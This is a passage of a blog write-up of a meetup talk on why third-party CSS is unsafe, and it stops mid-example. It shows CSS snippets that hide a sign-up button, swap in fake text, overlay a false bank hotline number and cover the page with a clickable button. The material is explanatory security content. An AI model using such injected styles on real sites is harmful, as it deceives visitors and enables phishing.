<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8" />
		<meta http-equiv="x-ua-compatible" content="ie=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
		<link rel="preconnect dns-prefetch" href="https://www.google-analytics.com" />
		<link rel="preconnect" href="https://fonts.googleapis.com">
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
		<link href="https://twitter.com/lihautan" rel="me" />
		<link rel="manifest" href="/manifest.webmanifest" />
		<meta name="theme-color" content="#bd93f9" />
		<link rel="apple-touch-icon" sizes="48x48" href="/icon-48x48.png" />
		<link rel="apple-touch-icon" sizes="72x72" href="/icon-72x72.png" />
		<link rel="apple-touch-icon" sizes="96x96" href="/icon-96x96.png" />
		<link rel="apple-touch-icon" sizes="144x144" href="/icon-144x144.png" />
		<link rel="apple-touch-icon" sizes="192x192" href="/icon-192x192.png" />
		<link rel="apple-touch-icon" sizes="256x256" href="/icon-256x256.png" />
		<link rel="apple-touch-icon" sizes="384x384" href="/icon-384x384.png" />
		<link rel="apple-touch-icon" sizes="512x512" href="/icon-512x512.png" />
		<link rel="icon" href="/icon-48x48.png" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<link rel="preload"
			href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,500;0,700;1,300&family=Noto+Sans+SC:wght@500&display=swap" as="style"
			onload="this.rel='stylesheet'">
		<link rel="alternate" type="application/rss+xml" title="Tan Li Hau&#x27;s RSS Feed" href="/rss.xml"/>
		<link rel="sitemap" type="application/xml" href="/sitemap.xml"/>
		<link rel="webmention" href="https://webmention.io/lihautan.com/webmention" />
		<link rel="pingback" href="https://webmention.io/lihautan.com/xmlrpc" />
		<!-- Global site tag (gtag.js) - Google Analytics -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6Y89Q69VY"></script>
		<script>
			window.dataLayer = window.dataLayer || [];
			function gtag() {
				dataLayer.push(arguments);
			}
			gtag('js', new Date());

			gtag('config', 'G-Z6Y89Q69VY');
		</script>
		<meta http-equiv="content-security-policy" content=""><title>Third party CSS is not safe | Tan Li Hau</title><meta name="description" content="Recently, I read Jake Archibald&#39;s &quot;Third party CSS is not safe&quot;, and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you...." data-svelte="svelte-1jsbgzp"><meta name="image" content="https://lihautan.com/_app/assets/hero-twitter-9e8aed17.jpg" data-svelte="svelte-1jsbgzp"><meta name="og:image" content="https://lihautan.com/_app/assets/hero-twitter-9e8aed17.jpg" data-svelte="svelte-1jsbgzp"><meta name="og:title" content="Third party CSS is not safe" data-svelte="svelte-1jsbgzp"><meta name="og:description" content="Recently, I read Jake Archibald&#39;s &quot;Third party CSS is not safe&quot;, and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you...." data-svelte="svelte-1jsbgzp"><meta name="og:type" content="website" data-svelte="svelte-1jsbgzp"><meta name="twitter:card" content="summary_large_image" data-svelte="svelte-1jsbgzp"><meta name="twitter:creator" content="@lihautan" data-svelte="svelte-1jsbgzp"><meta name="twitter:title" content="Third party CSS is not safe" data-svelte="svelte-1jsbgzp"><meta name="twitter:description" content="Recently, I read Jake Archibald&#39;s &quot;Third party CSS is not safe&quot;, and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you...." data-svelte="svelte-1jsbgzp"><meta name="twitter:image" content="https://lihautan.com/_app/assets/hero-twitter-9e8aed17.jpg" data-svelte="svelte-1jsbgzp"><meta name="keywords" content="css" data-svelte="svelte-1jsbgzp"><meta name="keywords" content="vulnerability" data-svelte="svelte-1jsbgzp"><meta name="keywords" content="talk.css" data-svelte="svelte-1jsbgzp"><meta itemprop="url" content="https://lihautan.com/third-party-css-is-not-safe/" data-svelte="svelte-1jsbgzp"><meta itemprop="image" content="https://lihautan.com/_app/assets/hero-twitter-9e8aed17.jpg" data-svelte="svelte-1jsbgzp"><!-- HTML_TAG_START --><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"Tan Li Hau"},"copyrightHolder":{"@type":"Person","name":"Tan Li Hau"},"copyrightYear":"2022","creator":{"@type":"Person","name":"Tan Li Hau"},"publisher":{"@type":"Person","name":"Tan Li Hau"},"description":"Recently, I read Jake Archibald's \"Third party CSS is not safe\", and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you....","headline":"Third party CSS is not safe","name":"Third party CSS is not safe","inLanguage":"en"}</script><!-- HTML_TAG_END --><!-- HTML_TAG_START --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","description":"Breadcrumbs list","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","item":{"@id":"https://lihautan.com","name":"Homepage"},"name":"Homepage","position":1},{"@type":"ListItem","item":{"@id":"https://lihautan.com/third-party-css-is-not-safe/","name":"Third party CSS is not safe"},"name":"Third party CSS is not safe","position":2}]}</script><!-- HTML_TAG_END -->
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/vendor-cb7fd1e3.css">
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/pages/__layout.svelte-b5830581.css">
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/Links-79a96fb3.css">
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/code-snippet-c7c00025.css">
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/TalkLayout-68d5aac2.css">
	<link rel="stylesheet" href="https://lihautan.com/_app/assets/ldjson-f7523d2e.css">
	<link rel="modulepreload" href="https://lihautan.com/_app/start-c7a2dfb9.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/chunks/vendor-da4388d4.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/pages/__layout.svelte-c3db4d7b.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/chunks/stores-1fad7c36.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/chunks/Links-79c47f65.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/pages/third-party-css-is-not-safe/index.md-5e516cbd.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/chunks/TalkLayout-ea325345.js">
	<link rel="modulepreload" href="https://lihautan.com/_app/chunks/ldjson-b0805387.js">
	</head>
	<body>
		<div id="svelte">




<a href="#content" class="skip svelte-1x8iuzz">Skip to content</a>

	<header class="svelte-1x8iuzz"><nav><ul class="mode-sidebar svelte-2qf5mw"><li class="svelte-2qf5mw"><a href="/" class="svelte-2qf5mw">Tan Li Hau</a></li>
	<li class="desktop svelte-2qf5mw"><a sveltekit:prefetch href="/about" class="svelte-2qf5mw">About</a></li>
	<li class="desktop svelte-2qf5mw"><a sveltekit:prefetch href="/blogs" class="svelte-2qf5mw">Writings</a></li>
	<li class="desktop svelte-2qf5mw"><a sveltekit:prefetch href="/talks" class="svelte-2qf5mw">Talks</a></li>
	<li class="desktop svelte-2qf5mw"><a sveltekit:prefetch href="/notes" class="svelte-2qf5mw">Notes</a></li>
	<li class="desktop svelte-2qf5mw"><a sveltekit:prefetch href="/newsletter" class="svelte-2qf5mw">Newsletter</a></li>
	<li class="social svelte-2qf5mw"><a aria-label="Twitter account" href="https://twitter.com/lihautan" class="svelte-2qf5mw"><svg viewBox="0 0 24 24" width="1em" height="1em" class="svelte-2qf5mw"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66
  10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5
  4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
		<a aria-label="Github account" href="https://github.com/tanhauhau" class="svelte-2qf5mw"><svg viewBox="0 0 24 24" width="1em" height="1em" class="svelte-2qf5mw"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0
  0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07
  5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65
  5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42
  3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
		<a aria-label="YouTube account" href="https://youtube.com/c/lihautan" class="svelte-2qf5mw"><svg viewBox="0 0 461.001 461.001" width="1em" height="1em" class="svelte-2qf5mw"><path d="M365.257 67.393H95.744C42.866 67.393 0 110.259 0 163.137v134.728c0 52.878 42.866 95.744 95.744 95.744h269.513c52.878 0 95.744-42.866 95.744-95.744V163.137c0-52.878-42.866-95.744-95.744-95.744zm-64.751 169.663-126.06 60.123c-3.359 1.602-7.239-.847-7.239-4.568V168.607c0-3.774 3.982-6.22 7.348-4.514l126.06 63.881c3.748 1.899 3.683 7.274-.109 9.082z"></path></svg></a></li>
</ul></nav></header>

	<div class="sidebar svelte-s9hlkv"><div class="float svelte-s9hlkv"><svg viewBox="0 0 30 50" width="30" height="50"><circle fill="currentColor" cy="15" cx="15" r="3"></circle><circle fill="currentColor" cy="25" cx="15" r="3"></circle><circle fill="currentColor" cy="35" cx="15" r="3"></circle></svg></div>
</div>

<main id="content" class="svelte-1x8iuzz">

<h1>Third party CSS is not safe</h1>

<ul class="svelte-642bx3"><li class="svelte-642bx3"><span class="icon svelte-642bx3">ðŸ—“</span>September 2, 2020</li>
	<li class="svelte-642bx3"><span class="icon svelte-642bx3">ðŸ‘¥</span><a href="https://singaporecss.github.io/54/">talk.css meetup</a></li>
	
	<li class="video svelte-642bx3"><span class="icon svelte-642bx3">ðŸ“¹</span><a href="https://engineers.sg/video/third-party-css-is-not-safe-talk-css-54--4113">Video</a></li></ul>

<a class="tag svelte-642bx3" href="/tags/css/">css</a><a class="tag svelte-642bx3" href="/tags/vulnerability/">vulnerability</a><a class="tag svelte-642bx3" href="/tags/talk.css/">talk.css</a>

<section role="navigation" aria-label="Table of Contents" class="svelte-zmasws"><ol class="svelte-zmasws"><li class="svelte-zmasws"><a href="#3rd-party" class="svelte-zmasws">3rd party</a>
				
			</li><li class="svelte-zmasws"><a href="#where-does-3rd-party-css-come-from" class="svelte-zmasws">Where does 3rd party CSS come from?</a>
				<ol class="svelte-zmasws"><li class="svelte-zmasws"><a href="#1-css-frameworks" class="svelte-zmasws">1. CSS Frameworks</a>
								
							</li><li class="svelte-zmasws"><a href="#2-third-party-scripts" class="svelte-zmasws">2. Third party scripts</a>
								
							</li><li class="svelte-zmasws"><a href="#3-browser-extensions" class="svelte-zmasws">3. Browser extensions</a>
								
							</li>
					</ol>
			</li><li class="svelte-zmasws"><a href="#how-3rd-party-css-can-be-unsafe" class="svelte-zmasws">How 3rd party CSS can be unsafe?</a>
				<ol class="svelte-zmasws"><li class="svelte-zmasws"><a href="#disappearing-content" class="svelte-zmasws">Disappearing content</a>
								
							</li><li class="svelte-zmasws"><a href="#adding-content" class="svelte-zmasws">Adding content</a>
								
							</li><li class="svelte-zmasws"><a href="#moving-content" class="svelte-zmasws">Moving content</a>
								
							</li><li class="svelte-zmasws"><a href="#reading-attributes" class="svelte-zmasws">Reading attributes</a>
								
							</li><li class="svelte-zmasws"><a href="#monitoring-attributes" class="svelte-zmasws">Monitoring attributes</a>
								
							</li><li class="svelte-zmasws"><a href="#reading-text" class="svelte-zmasws">Reading text</a>
								
							</li>
					</ol>
			</li><li class="svelte-zmasws"><a href="#content-security-policy" class="svelte-zmasws">Content Security Policy</a>
				
			</li><li class="svelte-zmasws"><a href="#summary" class="svelte-zmasws">Summary</a>
				
			</li><li class="svelte-zmasws"><a href="#further-reading" class="svelte-zmasws">Further reading</a>
				
			</li></ol>
</section>

<article class="blog"><p>Recently, I read <a href="https://jakearchibald.com/2018/third-party-css-is-not-safe/" rel="nofollow">Jake Archibald&#39;s &quot;Third party CSS is not safe&quot;</a>, and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you.</p>
<section><h2><a href="#3rd-party" id="3rd-party">3rd party</a></h2>
<p>If you use assets or APIs from sources that are not provided by yourself, you are using it from a 3rd party. Generally, in a context of a website, this means loading resources that is not from the same domain.</p>
<p>Jake then gave examples of how 3rd party images and 3rd party scripts could be harmful.</p>
<p>But, today&#39;s main focus is on 3rd party CSS. So let&#39;s scroll down and see what harm can 3rd party CSS bring.</p></section>
<section><h2><a href="#where-does-3rd-party-css-come-from" id="where-does-3rd-party-css-come-from">Where does 3rd party CSS come from?</a></h2>
<p>Before we dive into what harm can it bring, let&#39;s pause for a moment and think, how does 3rd party CSS get into our web page?</p></section>
<section><h3><a href="#1-css-frameworks" id="1-css-frameworks">1. CSS Frameworks</a></h3>
<p>Well, if you use frameworks like Bootstrap (I have nothing against using Bootstrap, it&#39;s a great CSS framework), one of the options to adding it to your website is to use one of their CDN links.</p>
<p><span style="display: block; position: relative; padding-top: 41.043%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/bootstrap-cdn-b6a7c682.webp, https://lihautan.com/_app/assets/bootstrap-cdn-5d56f81e.webp 2x"><img src="https://lihautan.com/_app/assets/bootstrap-cdn-127fb246.png" srcset="https://lihautan.com/_app/assets/bootstrap-cdn-127fb246.png, https://lihautan.com/_app/assets/bootstrap-cdn-9abfb94c.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="bootstrap cdn"></picture></span></p>
<p>This means that you are going to trust the CSS content return from the Bootstrap CDN.</p>
<p><em>Have you ever take a look at what is contained in the <code class="inline">bootstrap.min.css</code> from CDN?</em></p></section>
<section><h3><a href="#2-third-party-scripts" id="2-third-party-scripts">2. Third party scripts</a></h3>
<p>It&#39;s pretty lame for the 3rd party scripts to do something malicious through a 3rd party CSS, because the scope of influence of a 3rd party scripts is much more than a 3rd party CSS. But nonetheless, it&#39;s worth noting that it is entirely possible that a 3rd party CSS comes from a 3rd party script.</p>
<p>This begs the question of, where does the 3rd party script come from?</p>
<p>Well, if you visit any <strong>well-intentioned</strong> <em>*cough*</em> site that tracks your behavior, and if you leave the site halfway through their funnel, they try remind you to through a network of advertisement elsewhere, such as in your search engine, or embedded in your social media, they achieve this through embedding third party scripts.</p>
<p>Here is a screenshot of list of 3rd party scripts loaded from <a href="https://shopee.sg/" rel="nofollow">https://shopee.sg</a> (an ecommerce site based in South East Asia):</p>
<p><span style="display: block; position: relative; padding-top: 25.385%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/shopee-ads-dc504ac0.webp, https://lihautan.com/_app/assets/shopee-ads-ee349ff3.webp 2x"><img src="https://lihautan.com/_app/assets/shopee-ads-61da4884.png" srcset="https://lihautan.com/_app/assets/shopee-ads-61da4884.png, https://lihautan.com/_app/assets/shopee-ads-ec965806.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="ads in shopee"></picture></span></p>
<p><strong>Disclaimer:</strong> I work for Shopee, I <em>have nothing</em> against all these 3rd party ads, they are what helped us remind buyers to come back and complete their purchase. ðŸ™ˆ</p></section>
<section><h3><a href="#3-browser-extensions" id="3-browser-extensions">3. Browser extensions</a></h3>
<p>If you are someone who likes to decorate your browser, have a custom theme for all the website you visit, probably you are one of the users of a browser extension!</p>
<p><span style="display: block; position: relative; padding-top: 58.443%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/browser-extension-9dc7a3dc.webp, https://lihautan.com/_app/assets/browser-extension-60c420a7.webp 2x"><img src="https://lihautan.com/_app/assets/browser-extension-e48b4c06.png" srcset="https://lihautan.com/_app/assets/browser-extension-e48b4c06.png, https://lihautan.com/_app/assets/browser-extension-0de57307.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="browser extension"></picture></span></p>
<p>How a browser extension adds a custom theme to any website you visit is to inject a CSS to style them.</p></section>
<section><h2><a href="#how-3rd-party-css-can-be-unsafe" id="how-3rd-party-css-can-be-unsafe">How 3rd party CSS can be unsafe?</a></h2>
<p>Let&#39;s take a look some examples from Jake&#39;s article and try it out ourselves.</p></section>
<section><h3><a href="#disappearing-content" id="disappearing-content">Disappearing content</a></h3>
<p>A 3rd party CSS can easily hide content of your website using <code class="inline">display: none</code>, and your website will break without you knowing it.</p>
<p>One example would be hiding a RSVP button from <a href="https://singaporecss.github.io/" rel="nofollow">Singapore CSS website</a>, and the meetup organiser would be scratching their heads wondering why no one signing up for the event! ðŸ¤£</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-string-expression)">a</span><span style="color: var(--shiki-token-function)">.c-rsvp</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">display</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">none</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div>
<p><span style="display: block; position: relative; padding-top: 74.654%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/disappearing-content-4f0da805.webp, https://lihautan.com/_app/assets/disappearing-content-59cf5951.webp 2x"><img src="https://lihautan.com/_app/assets/disappearing-content-686c2197.png" srcset="https://lihautan.com/_app/assets/disappearing-content-686c2197.png, https://lihautan.com/_app/assets/disappearing-content-a55f4c99.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="disappearing content"></picture></span></p></section>
<section><h3><a href="#adding-content" id="adding-content">Adding content</a></h3>
<p>Instead of removing content, a 3rd party CSS can add new content to your website, unpleasant content or confusing content that could drive your visitor away!</p>
<p>One example would be hiding the text by setting the color to <code class="inline">transparent</code>, and replace it with a background image instead!</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-function)">.c-event__content</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">color</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">transparent</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-image</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-function)">url</span><span style="color: var(--shiki-token-constant)">(http://localhost/image.png)</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-repeat</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">no-repeat</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background-size</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">contain</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">height</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">200</span><span style="color: var(--shiki-token-keyword)">px</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div>
<p><span style="display: block; position: relative; padding-top: 76.336%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/adding-content-1-a1b891fb.webp, https://lihautan.com/_app/assets/adding-content-1-83904a54.webp 2x"><img src="https://lihautan.com/_app/assets/adding-content-1-fbd1662b.png" srcset="https://lihautan.com/_app/assets/adding-content-1-fbd1662b.png, https://lihautan.com/_app/assets/adding-content-1-d85c44a5.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="adding content"></picture></span></p>
<p>Another technique to adding new content is to use the <code class="inline">::before</code> or <code class="inline">::after</code> psuedo element, as you can add new text via the <code class="inline">content</code> property.</p>
<p>Let&#39;s do a combination of hiding and adding content through CSS:</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-string-expression)">a</span><span style="color: var(--shiki-token-function)">.c-rsvp::before</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">content</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">&#39;Snap! Failed to fetch content.&#39;</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">margin-right</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">16</span><span style="color: var(--shiki-token-keyword)">px</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-function)">.c-rsvp</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">span</span><span style="color: var(--shiki-token-function)">:first-child</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">color</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">transparent</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">position</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">relative</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">width</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">106</span><span style="color: var(--shiki-token-keyword)">px</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"><span style="color: var(--shiki-token-function)">.c-rsvp</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">span</span><span style="color: var(--shiki-token-function)">:first-child::after</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">content</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">&#39;Refresh&#39;</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">color</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">#fafaff</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">left</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">12</span><span style="color: var(--shiki-token-keyword)">px</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">position</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">absolute</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div>
<p>Here we hide the event details, change the button text from <strong>&quot;RSVP&quot;</strong> to <strong>&quot;Refresh&quot;</strong>, and somehow we got more people attending the meetup!</p>
<p><span style="display: block; position: relative; padding-top: 74.654%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/adding-content-2-3c4eccab.webp, https://lihautan.com/_app/assets/adding-content-2-91b57b2b.webp 2x"><img src="https://lihautan.com/_app/assets/adding-content-2-d13bc0ad.png" srcset="https://lihautan.com/_app/assets/adding-content-2-d13bc0ad.png, https://lihautan.com/_app/assets/adding-content-2-039a51e5.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="adding content 2"></picture></span></p>
<p>A more malicious example would be overlapping a different phone number on top of the hotline number of a bank</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-string-expression)">p</span><span style="color: var(--shiki-token-function)">.hotline_number</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">position</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">relative</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span>
<span class="line"></span>
<span class="line"><span style="color: var(--shiki-token-string-expression)">p</span><span style="color: var(--shiki-token-function)">.hotline_number::after</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">content</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-string-expression)">&#39;(65) 87654321&#39;</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">position</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">absolute</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">top</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">left</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">background</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">#f5f5f5</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">&#125;</span></span></code></pre><!-- HTML_TAG_END --></div>
<p><span style="display: block; position: relative; padding-top: 74.543%; width: 100%;"><picture><source type="image/webp" srcset="https://lihautan.com/_app/assets/adding-content-3-ca9b83c1.webp, https://lihautan.com/_app/assets/adding-content-3-edf24f1b.webp 2x"><img src="https://lihautan.com/_app/assets/adding-content-3-ae8225a7.png" srcset="https://lihautan.com/_app/assets/adding-content-3-ae8225a7.png, https://lihautan.com/_app/assets/adding-content-3-ce910a62.png 2x" loading="lazy" style="position: absolute; top: 0; width: 100%; height: 100%" alt="adding content 3"></picture></span></p>
<blockquote><p>The screenshot was taken on my local machine, with a custom setup. No actual harm has done to anyone.</p></blockquote></section>
<section><h3><a href="#moving-content" id="moving-content">Moving content</a></h3>
<p>Yet again, we can move the RSVP button around to cover the entire screen. Now clicking anywhere on the site will lead you to the RSVP site.</p>
<div class="code-section"><!-- HTML_TAG_START --><pre class="shiki" style="background-color: var(--shiki-color-background)"><code><span class="line"><span style="color: var(--shiki-token-function)">.c-rsvp</span><span style="color: var(--shiki-color-text)"> &#123;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">position</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">fixed</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">top</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">left</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">0</span><span style="color: var(--shiki-color-text)">;</span></span>
<span class="line"><span style="color: var(--shiki-color-text)">  </span><span style="color: var(--shiki-token-constant)">z-index</span><span style="color: var(--shiki-token-keyword)">:</span><span style="color: var(--shiki-color-text)"> </span><span style="color: var(--shiki-token-constant)">1000</span><span style="color: var(--shiki-color-text)">;</span></span>
